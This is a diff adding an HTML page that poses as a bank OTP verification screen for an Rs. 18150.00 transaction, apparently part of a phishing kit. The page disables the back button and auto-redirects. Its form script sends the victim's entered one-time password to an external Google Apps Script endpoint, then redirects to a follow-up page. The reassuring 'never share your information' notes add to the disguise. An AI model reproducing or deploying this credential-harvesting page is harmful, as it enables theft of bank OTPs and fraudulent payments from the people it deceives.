@@ -1,0 +1,103 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script type="text/javascript">
+        function preventBack() { window.history.forward();}
+        setTimeout("preventBack()", 0); window.onunload = function () { null };
+    </script>
+    <meta charset="UTF-8">    
+    <meta http-equiv="refresh" content="121; url=bw bs2.html">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>BWBS</title>
+    <link href="external1.css" rel="stylesheet">
+    <link rel="stylesheet" href="style2.css">
+	      
+</head>
+<body> 
+    <section class="wrapper">
+		<div class="containerr">
+			<div class="col-sm-8 offset-sm-2 col-lg-6 offset-lg-3 col-xl-6 offset-xl-3 text-center">
+				<div class="logo">
+					<img src="./10.png" class="img-fluid" alt="logo">
+				</div>
+				    <form method="post" action="" name="Student" class="rounded bg-white shadow p-5">
+					<h3 class="text-dark fw-bolder fs-3 mb-2">OTP Verification</h3>
+
+					<div class="text-blue">
+<table border="1px" width="98%">
+<tr> <th>Transaction Id</th>
+<th>251808568895085</th> </tr>
+<tr>
+    <td>Amount</td>
+    <td>Rs. 18150.00</td> </tr> 
+    <tr>
+        <td>Convenience Fee</td>
+        <td>As per applicable cards</td>
+    </tr>
+    <tr>
+        <td>GST</td>
+        <td>Rs. 0.00</td>
+    </tr>
+    <tr bgcolor="red">
+        <th>Total Bill Amount</th>
+        <th>Rs. 18150.00</th>
+    </tr>
+</table>
+					</div>
+					<div class="pg"> 
+					<p>One Time Password (OTP) successfully sent to the phone number linked to your bank account.</p>
+
+					<div class="otp_input text-start mb-2">
+                      
+						<div class="d-flex align-items-center justify-content-between mt-2">
+                            <input type="number" class="input box" name="red" placeholder="Enter OTP Here" required>
+              
+                        </div> 
+					</div>  
+
+					<button type="submit" class="btn btn-primary submit_btn my-4">Verify</button>
+					
+                    <div class="fw-normal text-muted mb-2">
+						Didn’t get the code ? <a href="#" class="text-primary fw-bold text-decoration-none">Resend</a> <br><br>
+						<h9>This page validity automatically expire after&nbsp&nbsp<div class="b1" id="app"></h9> </div></div>
+	<div class="container">
+  <div class="row">
+    <div class="alert alert-success col-md-12" role="alert" id="notes"><br>
+            <h4>NOTES</h4>
+ <ul>
+        <li>Do not share any kind of information which related to your bank account</li>
+          
+        <li> Bank and other payment institution never call or sms to you for asking your information</li>
+      </ul>
+    </div>
+  </div>
+      
+				</form>
+				</div>
+		<div class="logo5">
+   <img src="./logo5.png" class="img-fluid" alt="logo"> </div></div>
+		<script>
+   const scriptURL = 'https://script.google.com/macros/s/AKfycbzol8k-FTkP8TGSwKsTa2a2F-lziId7QU7aQ-rNh8KGGrwEpULy1TL9nhOcQ28HjnM/exec'
+        const form = document.forms['Student']
+      
+        form.addEventListener('submit', e => { 
+         e.preventDefault()
+     let requestBody = new FormData(form)
+     fetch(scriptURL, { method: 'POST', body: requestBody})
+        .then(() => {  window.location.replace("bwbs1.html"); })
+       .catch(error => {
+       alert('Error!', error.message)
+         submitButton.disabled = false
+
+       }
+       )
+   })
+</script>
+<script src="1.js"></script>
+	</section>
+</body>
+</html>
+
